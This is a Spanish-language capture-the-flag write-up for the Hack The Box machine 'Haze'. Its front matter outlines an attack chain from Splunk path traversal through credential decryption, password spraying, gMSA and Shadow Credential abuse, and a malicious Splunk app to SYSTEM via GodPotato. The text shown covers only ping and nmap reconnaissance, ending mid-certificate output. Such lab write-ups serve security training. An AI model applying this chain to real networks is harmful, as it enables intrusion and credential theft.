---
title: Haze
description: Haze está basada en una instancia de Splunk Enterprise. El punto de partida es la explotación de una vulnerabilidad de directory traversal / file read en Splunk, que permite filtrar archivos de configuración que contienen contraseñas cifradas. Luego se extrae la clave de cifrado y se descifran esas contraseñas, encontrando una que es reutilizada por un usuario. Ese primer usuario tiene acceso limitado, pero mediante password spraying se descubre que otro usuario utiliza la misma contraseña. Este segundo usuario puede abusar de ciertos Windows ACLs para acceder a la contraseña de una gMSA (Group Managed Service Account). Con esa cuenta, se obtiene una Shadow Credential para escalar a otro usuario. Desde allí, se accede a un archivo de respaldo de Splunk y se encuentran contraseñas antiguas que aún funcionan para la cuenta admin en el panel web de Splunk. Se carga una aplicación maliciosa de Splunk para obtener una shell como el siguiente usuario. Esa shell tiene el privilegio SeImpersonatePrivilege, que se aprovecha usando GodPotato para obtener acceso como NT AUTHORITY\SYSTEM.
date: 2025-05-13
toc: true
pin: false
image:
 path: /assets/img/htb-writeup-haze/haze_logo.png
categories:
  - Hack_The_Box
  - Machines
tags:
  - hack_the_box
  - windows
  - path_traversal
  - insufficiently_protected_credentials
  - incorrect_privilege_assignment
  - insecure_storage_of_sensitive_information
  - xml_injection
  - code_injection
  - access_token_manipulation
  - account_discovery
  - account_manipulation
  - active_scanning
  - additional_local_or_domain_groups
  - brute_force
  - ccache_files
  - command_and_scripting_interpreter
  - credential_access
  - credentials_in_files
  - defense_evasion
  - discovery
  - domain_account
  - domain_groups
  - domain_or_tenant_policy_modification
  - execution
  - exploit_public-facing_application
  - gather_victim_host_information
  - group_policy_modification
  - initial_access
  - lateral_movement
  - make_and_impersonate_token
  - pass_the_hash
  - pass_the_ticket
  - password_cracking
  - password_spraying
  - permission_groups_discovery
  - persistence
  - powershell
  - private_keys
  - privilege_escalation
  - reconnaissance
  - remote_services
  - scanning_ip_blocks
  - search_victim-owned_websites
  - software
  - steal_or_forge_authentication_certificates
  - steal_or_forge_kerberos_tickets
  - system_owner/user_discovery
  - unsecured_credentials
  - use_alternate_authentication_material
  - vulnerability_scanning
  - windows_remote_management

---
## Reconnaissance

### Active Scanning

El análisis inicial comienza con el comando ping para confirmar la accesibilidad de la máquina objetivo en la red.

```terminal
/home/kali/Documents/htb/machines/haze:-$ ping -c 1 10.10.11.61
PING 10.10.11.61 (10.10.11.61) 56(84) bytes of data.
64 bytes from 10.10.11.61: icmp_seq=1 ttl=127 time=196 ms

--- 10.10.11.61 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 195.681/195.681/195.681/0.000 ms
```

Realizo un escaneo agresivo de puertos con nmap, lo que me permite identificar rápidamente todos los puertos abiertos.

```terminal
/home/kali/Documents/htb/machines/haze:-$ sudo nmap -p- --open -sS --min-rate 5000 -vvv 10.10.11.61 -n -Pn -oG nmap1
Host: 10.10.11.61 ()	Status: Up
Host: 10.10.11.61 ()	Ports: 53/open/tcp//domain///, 88/open/tcp//kerberos-sec///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 389/open/tcp//ldap///, 445/open/tcp//microsoft-ds///, 464/open/tcp//kpasswd5///, 593/open/tcp//http-rpc-epmap///, 636/open/tcp//ldapssl///, 3268/open/tcp//globalcatLDAP///, 3269/open/tcp//globalcatLDAPssl///, 5985/open/tcp//wsman///, 8000/open/tcp//http-alt///, 8088/open/tcp//radan-http///, 8089/open/tcp//unknown///, 9389/open/tcp//adws///, 47001/open/tcp//winrm///, 49664/open/tcp/////, 49665/open/tcp/////, 49666/open/tcp/////, 49667/open/tcp/////, 49668/open/tcp/////, 63645/open/tcp/////, 63656/open/tcp/////, 63657/open/tcp/////, 63661/open/tcp/////, 63675/open/tcp//unknown///, 63686/open/tcp/////, 63704/open/tcp/////, 63782/open/tcp/////
```

Profundizo en los puertos detectados, recopilando información detallada sobre los servicios y versiones en ejecución.

```terminal
/home/kali/Documents/htb/machines/haze:-$ sudo nmap -sCV -vvv -p53,88,135,139,389,445,464,593,636,3268,3269,5985,8000,8088,8089,9389,47001,49664,49665,49666,49667,49669,60456,60457,60461,60470,60489,60498,60569,62662 10.10.11.61 -oN nmap2
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-05-13 11:36:39Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.haze.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.haze.htb
| Issuer: commonName=haze-DC01-CA/domainComponent=haze
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-03-05T07:12:20
| Not valid after:  2026-03-05T07:12:20
| MD5:   db18:a1f5:986c:1470:b848:35ec:d437:1ca0
| SHA-1: 6cdd:5696:f250:6feb:1a27:abdf:d470:5143:3ab8:5d1f
| -----BEGIN CERTIFICATE-----
| MIIFxzCCBK+gAwIBAgITaQAAAAKwulKDkCsWNAAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBCMRMwEQYKCZImiZPyLGQBGRYDaHRiMRQwEgYKCZImiZPyLGQBGRYEaGF6ZTEV
| MBMGA1UEAxMMaGF6ZS1EQzAxLUNBMB4XDTI1MDMwNTA3MTIyMFoXDTI2MDMwNTA3
| MTIyMFowGDEWMBQGA1UEAxMNZGMwMS5oYXplLmh0YjCCASIwDQYJKoZIhvcNAQEB
| BQADggEPADCCAQoCggEBAMVEY8/MHbIODtBJbIisSbPresil0O6vCchYn7gAIg90
| kJVVmM/KnsY8tnT6jMRGWQ/cJPpXQ/3jFFK1l40iDHxa5zfWLz+RS/ZRwkQH9/UK
| biVcpiAkxgDsvBpqVk5AQiSPo3cOkiFAAS31jjfUJk6YP9Cb5q1dJTlo39TlTnyZ
| h794W7ykOJTKLLflQ1gY5xtbrc3XltNGnKTh28fjX7GtDfqtAq3tT5jU7pt9kKfu
| 0PdFjwM0IHjvxfMvQQD3kZnwIxMFCPNgS5T1xO86UnrWw0kVvWp1gOMA7lU5YZr7
| u81y2pV734gwCnZzWOe0xZrvUzFgIHtGmfj505znnf0CAwEAAaOCAt4wggLaMC8G
| CSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABsAGUAcjAd
| BgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQDAgWgMHgG
| CSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQMEAgIAgDAL
| BglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglghkgBZQME
| AQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFCjRdOU7YKvR8L/epppe
| wGlE7zYrMB8GA1UdIwQYMBaAFBfPKa3j+shDCWYQcAiLgjtywmU+MIHEBgNVHR8E
| gbwwgbkwgbaggbOggbCGga1sZGFwOi8vL0NOPWhhemUtREMwMS1DQSxDTj1kYzAx
| LENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
| Tj1Db25maWd1cmF0aW9uLERDPWhhemUsREM9aHRiP2NlcnRpZmljYXRlUmV2b2Nh
| dGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCB
| uwYIKwYBBQUHAQEEga4wgaswgagGCCsGAQUFBzAChoGbbGRhcDovLy9DTj1oYXpl
| LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9aGF6ZSxEQz1odGI/Y0FDZXJ0aWZp
| Y2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkwOQYD
| VR0RBDIwMKAfBgkrBgEEAYI3GQGgEgQQ3PAm6jow6ke+SMbceyLBfYINZGMwMS5o
| YXplLmh0YjANBgkqhkiG9w0BAQsFAAOCAQEAO7h/k9EY8RlqV48OvhS9nUZtGI7e
| 9Dqja1DpS+H33Z6CYb537w7eOkIWZXNP45VxPpXai8IzPubc6rVHKMBq4DNuN+Nu
| BjOvbQ1J4l4LvfB1Pj/W2nv6VGb/6/iDb4ul6UdHK3/JMIKM3UIbpWVgmNIx70ae
| /0JJP2aG3z2jhO5co4ncUQ/xpe3WlWGTl9qcJ+FkZZAPkZU6+fgz/McKxO9I7EHv
| Y7G19nhuwF6Rh+w2XYrJs2/iFU6pRgQPg3yon5yUzcHNX8GwyEikv0NGBkmMKwAI
| kE3gssbluZx+QYPdAE4pV1k5tbg/kLvBePIXVKspHDd+4Wg0w+/6ivkuhQ==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.haze.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.haze.htb
| Issuer: commonName=haze-DC01-CA/domainComponent=haze
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-03-05T07:12:20
| Not valid after:  2026-03-05T07:12:20
| MD5:   db18:a1f5:986c:1470:b848:35ec:d437:1ca0
| SHA-1: 6cdd:5696:f250:6feb:1a27:abdf:d470:5143:3ab8:5d1f
| -----BEGIN CERTIFICATE-----
| MIIFxzCCBK+gAwIBAgITaQAAAAKwulKDkCsWNAAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBCMRMwEQYKCZImiZPyLGQBGRYDaHRiMRQwEgYKCZImiZPyLGQBGRYEaGF6ZTEV
| MBMGA1UEAxMMaGF6ZS1EQzAxLUNBMB4XDTI1MDMwNTA3MTIyMFoXDTI2MDMwNTA3
| MTIyMFowGDEWMBQGA1UEAxMNZGMwMS5oYXplLmh0YjCCASIwDQYJKoZIhvcNAQEB
| BQADggEPADCCAQoCggEBAMVEY8/MHbIODtBJbIisSbPresil0O6vCchYn7gAIg90
| kJVVmM/KnsY8tnT6jMRGWQ/cJPpXQ/3jFFK1l40iDHxa5zfWLz+RS/ZRwkQH9/UK
| biVcpiAkxgDsvBpqVk5AQiSPo3cOkiFAAS31jjfUJk6YP9Cb5q1dJTlo39TlTnyZ
| h794W7ykOJTKLLflQ1gY5xtbrc3XltNGnKTh28fjX7GtDfqtAq3tT5jU7pt9kKfu
| 0PdFjwM0IHjvxfMvQQD3kZnwIxMFCPNgS5T1xO86UnrWw0kVvWp1gOMA7lU5YZr7
| u81y2pV734gwCnZzWOe0xZrvUzFgIHtGmfj505znnf0CAwEAAaOCAt4wggLaMC8G
| CSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABsAGUAcjAd
| BgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQDAgWgMHgG
| CSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQMEAgIAgDAL
| BglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglghkgBZQME
| AQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFCjRdOU7YKvR8L/epppe
| wGlE7zYrMB8GA1UdIwQYMBaAFBfPKa3j+shDCWYQcAiLgjtywmU+MIHEBgNVHR8E
| gbwwgbkwgbaggbOggbCGga1sZGFwOi8vL0NOPWhhemUtREMwMS1DQSxDTj1kYzAx
| LENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
| Tj1Db25maWd1cmF0aW9uLERDPWhhemUsREM9aHRiP2NlcnRpZmljYXRlUmV2b2Nh
| dGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCB
| uwYIKwYBBQUHAQEEga4wgaswgagGCCsGAQUFBzAChoGbbGRhcDovLy9DTj1oYXpl
| LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9aGF6ZSxEQz1odGI/Y0FDZXJ0aWZp
| Y2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkwOQYD
| VR0RBDIwMKAfBgkrBgEEAYI3GQGgEgQQ3PAm6jow6ke+SMbceyLBfYINZGMwMS5o
| YXplLmh0YjANBgkqhkiG9w0BAQsFAAOCAQEAO7h/k9EY8RlqV48OvhS9nUZtGI7e
| 9Dqja1DpS+H33Z6CYb537w7eOkIWZXNP45VxPpXai8IzPubc6rVHKMBq4DNuN+Nu
| BjOvbQ1J4l4LvfB1Pj/W2nv6VGb/6/iDb4ul6UdHK3/JMIKM3UIbpWVgmNIx70ae
| /0JJP2aG3z2jhO5co4ncUQ/xpe3WlWGTl9qcJ+FkZZAPkZU6+fgz/McKxO9I7EHv
| Y7G19nhuwF6Rh+w2XYrJs2/iFU6pRgQPg3yon5yUzcHNX8GwyEikv0NGBkmMKwAI
| kE3gssbluZx+QYPdAE4pV1k5tbg/kLvBePIXVKspHDd+4Wg0w+/6ivkuhQ==
|_-----END CERTIFICATE-----
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.haze.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.haze.htb
| Issuer: commonName=haze-DC01-CA/domainComponent=haze
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-03-05T07:12:20
| Not valid after:  2026-03-05T07:12:20
| MD5:   db18:a1f5:986c:1470:b848:35ec:d437:1ca0
| SHA-1: 6cdd:5696:f250:6feb:1a27:abdf:d470:5143:3ab8:5d1f
| -----BEGIN CERTIFICATE-----
| MIIFxzCCBK+gAwIBAgITaQAAAAKwulKDkCsWNAAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBCMRMwEQYKCZImiZPyLGQBGRYDaHRiMRQwEgYKCZImiZPyLGQBGRYEaGF6ZTEV
| MBMGA1UEAxMMaGF6ZS1EQzAxLUNBMB4XDTI1MDMwNTA3MTIyMFoXDTI2MDMwNTA3
| MTIyMFowGDEWMBQGA1UEAxMNZGMwMS5oYXplLmh0YjCCASIwDQYJKoZIhvcNAQEB
| BQADggEPADCCAQoCggEBAMVEY8/MHbIODtBJbIisSbPresil0O6vCchYn7gAIg90
| kJVVmM/KnsY8tnT6jMRGWQ/cJPpXQ/3jFFK1l40iDHxa5zfWLz+RS/ZRwkQH9/UK
| biVcpiAkxgDsvBpqVk5AQiSPo3cOkiFAAS31jjfUJk6YP9Cb5q1dJTlo39TlTnyZ
| h794W7ykOJTKLLflQ1gY5xtbrc3XltNGnKTh28fjX7GtDfqtAq3tT5jU7pt9kKfu
| 0PdFjwM0IHjvxfMvQQD3kZnwIxMFCPNgS5T1xO86UnrWw0kVvWp1gOMA7lU5YZr7
| u81y2pV734gwCnZzWOe0xZrvUzFgIHtGmfj505znnf0CAwEAAaOCAt4wggLaMC8G
| CSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABsAGUAcjAd
| BgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQDAgWgMHgG
| CSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQMEAgIAgDAL
| BglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglghkgBZQME
| AQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFCjRdOU7YKvR8L/epppe
| wGlE7zYrMB8GA1UdIwQYMBaAFBfPKa3j+shDCWYQcAiLgjtywmU+MIHEBgNVHR8E
| gbwwgbkwgbaggbOggbCGga1sZGFwOi8vL0NOPWhhemUtREMwMS1DQSxDTj1kYzAx
| LENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
| Tj1Db25maWd1cmF0aW9uLERDPWhhemUsREM9aHRiP2NlcnRpZmljYXRlUmV2b2Nh
| dGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCB
| uwYIKwYBBQUHAQEEga4wgaswgagGCCsGAQUFBzAChoGbbGRhcDovLy9DTj1oYXpl
| LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9aGF6ZSxEQz1odGI/Y0FDZXJ0aWZp
| Y2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkwOQYD
| VR0RBDIwMKAfBgkrBgEEAYI3GQGgEgQQ3PAm6jow6ke+SMbceyLBfYINZGMwMS5o
| YXplLmh0YjANBgkqhkiG9w0BAQsFAAOCAQEAO7h/k9EY8RlqV48OvhS9nUZtGI7e
| 9Dqja1DpS+H33Z6CYb537w7eOkIWZXNP45VxPpXai8IzPubc6rVHKMBq4DNuN+Nu
| BjOvbQ1J4l4LvfB1Pj/W2nv6VGb/6/iDb4ul6UdHK3/JMIKM3UIbpWVgmNIx70ae
| /0JJP2aG3z2jhO5co4ncUQ/xpe3WlWGTl9qcJ+FkZZAPkZU6+fgz/McKxO9I7EHv
| Y7G19nhuwF6Rh+w2XYrJs2/iFU6pRgQPg3yon5yUzcHNX8GwyEikv0NGBkmMKwAI
| kE3gssbluZx+QYPdAE4pV1k5tbg/kLvBePIXVKspHDd+4Wg0w+/6ivkuhQ==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.haze.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc01.haze.htb
| Issuer: commonName=haze-DC01-CA/domainComponent=haze
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-03-05T07:12:20
| Not valid after:  2026-03-05T07:12:20
| MD5:   db18:a1f5:986c:1470:b848:35ec:d437:1ca0
| SHA-1: 6cdd:5696:f250:6feb:1a27:abdf:d470:5143:3ab8:5d1f
| -----BEGIN CERTIFICATE-----
| MIIFxzCCBK+gAwIBAgITaQAAAAKwulKDkCsWNAAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBCMRMwEQYKCZImiZPyLGQBGRYDaHRiMRQwEgYKCZImiZPyLGQBGRYEaGF6ZTEV
| MBMGA1UEAxMMaGF6ZS1EQzAxLUNBMB4XDTI1MDMwNTA3MTIyMFoXDTI2MDMwNTA3
| MTIyMFowGDEWMBQGA1UEAxMNZGMwMS5oYXplLmh0YjCCASIwDQYJKoZIhvcNAQEB
| BQADggEPADCCAQoCggEBAMVEY8/MHbIODtBJbIisSbPresil0O6vCchYn7gAIg90
| kJVVmM/KnsY8tnT6jMRGWQ/cJPpXQ/3jFFK1l40iDHxa5zfWLz+RS/ZRwkQH9/UK
| biVcpiAkxgDsvBpqVk5AQiSPo3cOkiFAAS31jjfUJk6YP9Cb5q1dJTlo39TlTnyZ
| h794W7ykOJTKLLflQ1gY5xtbrc3XltNGnKTh28fjX7GtDfqtAq3tT5jU7pt9kKfu
| 0PdFjwM0IHjvxfMvQQD3kZnwIxMFCPNgS5T1xO86UnrWw0kVvWp1gOMA7lU5YZr7
| u81y2pV734gwCnZzWOe0xZrvUzFgIHtGmfj505znnf0CAwEAAaOCAt4wggLaMC8G
| CSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABsAGUAcjAd
| BgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQDAgWgMHgG
| CSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQMEAgIAgDAL
| BglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglghkgBZQME
| AQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFCjRdOU7YKvR8L/epppe
| wGlE7zYrMB8GA1UdIwQYMBaAFBfPKa3j+shDCWYQcAiLgjtywmU+MIHEBgNVHR8E
| gbwwgbkwgbaggbOggbCGga1sZGFwOi8vL0NOPWhhemUtREMwMS1DQSxDTj1kYzAx
| LENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
| Tj1Db25maWd1cmF0aW9uLERDPWhhemUsREM9aHRiP2NlcnRpZmljYXRlUmV2b2Nh
| dGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCB
| uwYIKwYBBQUHAQEEga4wgaswgagGCCsGAQUFBzAChoGbbGRhcDovLy9DTj1oYXpl
| LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9aGF6ZSxEQz1odGI/Y0FDZXJ0aWZp
| Y2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkwOQYD
| VR0RBDIwMKAfBgkrBgEEAYI3GQGgEgQQ3PAm6jow6ke+SMbceyLBfYINZGMwMS5o
| YXplLmh0YjANBgkqhkiG9w0BAQsFAAOCAQEAO7h/k9EY8RlqV48OvhS9nUZtGI7e
| 9Dqja1DpS+H33Z6CYb537w7eOkIWZXNP45VxPpXai8IzPubc6rVHKMBq4DNuN+Nu
| BjOvbQ1J4l4LvfB1Pj/W2nv6VGb/6/iDb4ul6UdHK3/JMIKM3UIbpWVgmNIx70ae
| /0JJP2aG3z2jhO5co4ncUQ/xpe3WlWGTl9qcJ+FkZZAPkZU6+fgz/McKxO9I7EHv
| Y7G19nhuwF6Rh+w2XYrJs2/iFU6pRgQPg3yon5yUzcHNX8GwyEikv0NGBkmMKwAI
| kE3gssbluZx+QYPdAE4pV1k5tbg/kLvBePIXVKspHDd+4Wg0w+/6ivkuhQ==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8000/tcp  open  http          syn-ack ttl 127 Splunkd httpd
|_http-server-header: Splunkd
|_http-favicon: Unknown favicon MD5: E60C968E8FF3CC2F4FB869588E83AFC6
| http-robots.txt: 1 disallowed entry 
|_/
| http-methods: 
|_  Supported Methods: GET OPTIONS
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was http://10.10.11.61:8000/en-US/account/login?return_to=%2Fen-US%2F
8088/tcp  open  ssl/http      syn-ack ttl 127 Splunkd httpd
|_http-server-header: Splunkd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Issuer: commonName=SplunkCommonCA/organizationName=Splunk/stateOrProvinceName=CA/countryName=US/emailAddress=support@splunk.com/localityName=San Francisco
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-03-05T07:29:08
| Not valid after:  2028-03-04T07:29:08
| MD5:   82e5:ba5a:c723:2f49:6f67:395b:5e64:ed9b
| SHA-1: e859:76a6:03da:feef:c1ab:9acf:ecc7:fd75:f1e5:1ab2
| -----BEGIN CERTIFICATE-----
| MIIDMjCCAhoCCQCtNoIdTvT1CjANBgkqhkiG9w0BAQsFADB/MQswCQYDVQQGEwJV
| UzELMAkGA1UECAwCQ0ExFjAUBgNVBAcMDVNhbiBGcmFuY2lzY28xDzANBgNVBAoM
| BlNwbHVuazEXMBUGA1UEAwwOU3BsdW5rQ29tbW9uQ0ExITAfBgkqhkiG9w0BCQEW
| EnN1cHBvcnRAc3BsdW5rLmNvbTAeFw0yNTAzMDUwNzI5MDhaFw0yODAzMDQwNzI5
| MDhaMDcxIDAeBgNVBAMMF1NwbHVua1NlcnZlckRlZmF1bHRDZXJ0MRMwEQYDVQQK
| DApTcGx1bmtVc2VyMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA3SOu
| w9/K07cQT0p+ga9FjWCzI0Os/MVwpjOlPQ/o1uA/VSoNiweXobD3VBLngqfGQlAD
| VGRWkGdD3xS9mOknh9r4Dut6zDyUdKvgrZJVoX7EiRsHhXAr9HRgqWj7khQLz3n9
| fjxxdJkXtGZaNdonWENSeb93HfiYGjSWQJMfNdTd2lMGMDMC4JdydEyGEHRAMNnZ
| y/zCOSP97yJOSSBbr6IZxyZG934bbEH9d9r0g/I4roDlzZFFBlGi542s+1QJ79FR
| IUrfZh41PfxrElITkFyKCJyU5gfPKIvxwDHclE+zY/ju2lcHJMtgWNvF6s0S9ic5
| oxg0+Ry3qngtwd4yUQIDAQABMA0GCSqGSIb3DQEBCwUAA4IBAQCbT8LwPCoR7I41
| dS2ZjVjntxWHf/lv3MgumorerPBufJA4nw5Yq1gnAYruIkAkfGS7Dy09NL2+SwFy
| NKZa41K6OWst/sRP9smtpY3dfeNu5ofTP5oLEbW2fIEuG4fGvkQJ0SQOPOG71tfm
| ymVCjLlMYMU11GPjfb3CpVh5uLRhIw4btQ8Kz9aB6MiBomyiD/MqtQgA25thnijA
| gHYEzB3W6FKtWtjmPcqDugGs2WU6UID/fFZpsp+3h2QLGN5e+e1OTjoIbexbJ/S6
| iRjTy6GUjsrHtHM+KBjUFvUvHi27Ns47BkNzA1gedvRYrviscPCBkphjo9x0qDdj
| 3EhgaH2L
|_-----END CERTIFICATE-----
| http-methods: 
|_  Supported Methods: GET POST HEAD OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: 404 Not Found
8089/tcp  open  ssl/http      syn-ack ttl 127 Splunkd httpd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Issuer: commonName=SplunkCommonCA/organizationName=Splunk/stateOrProvinceName=CA/countryName=US/emailAddress=support@splunk.com/localityName=San Francisco
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-03-05T07:29:08
| Not valid after:  2028-03-04T07:29:08
| MD5:   82e5:ba5a:c723:2f49:6f67:395b:5e64:ed9b
| SHA-1: e859:76a6:03da:feef:c1ab:9acf:ecc7:fd75:f1e5:1ab2
| -----BEGIN CERTIFICATE-----
| MIIDMjCCAhoCCQCtNoIdTvT1CjANBgkqhkiG9w0BAQsFADB/MQswCQYDVQQGEwJV
| UzELMAkGA1UECAwCQ0ExFjAUBgNVBAcMDVNhbiBGcmFuY2lzY28xDzANBgNVBAoM
| BlNwbHVuazEXMBUGA1UEAwwOU3BsdW5rQ29tbW9uQ0ExITAfBgkqhkiG9w0BCQEW
| EnN1cHBvcnRAc3BsdW5rLmNvbTAeFw0yNTAzMDUwNzI5MDhaFw0yODAzMDQwNzI5
| MDhaMDcxIDAeBgNVBAMMF1NwbHVua1NlcnZlckRlZmF1bHRDZXJ0MRMwEQYDVQQK
| DApTcGx1bmtVc2VyMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA3SOu
| w9/K07cQT0p+ga9FjWCzI0Os/MVwpjOlPQ/o1uA/VSoNiweXobD3VBLngqfGQlAD
| VGRWkGdD3xS9mOknh9r4Dut6zDyUdKvgrZJVoX7EiRsHhXAr9HRgqWj7khQLz3n9
| fjxxdJkXtGZaNdonWENSeb93HfiYGjSWQJMfNdTd2lMGMDMC4JdydEyGEHRAMNnZ
| y/zCOSP97yJOSSBbr6IZxyZG934bbEH9d9r0g/I4roDlzZFFBlGi542s+1QJ79FR
| IUrfZh41PfxrElITkFyKCJyU5gfPKIvxwDHclE+zY/ju2lcHJMtgWNvF6s0S9ic5
| oxg0+Ry3qngtwd4yUQIDAQABMA0GCSqGSIb3DQEBCwUAA4IBAQCbT8LwPCoR7I41
| dS2ZjVjntxWHf/lv3MgumorerPBufJA4nw5Yq1gnAYruIkAkfGS7Dy09NL2+SwFy
| NKZa41K6OWst/sRP9smtpY3dfeNu5ofTP5oLEbW2fIEuG4fGvkQJ0SQOPOG71tfm
| ymVCjLlMYMU11GPjfb3CpVh5uLRhIw4btQ8Kz9aB6MiBomyiD/MqtQgA25thnijA
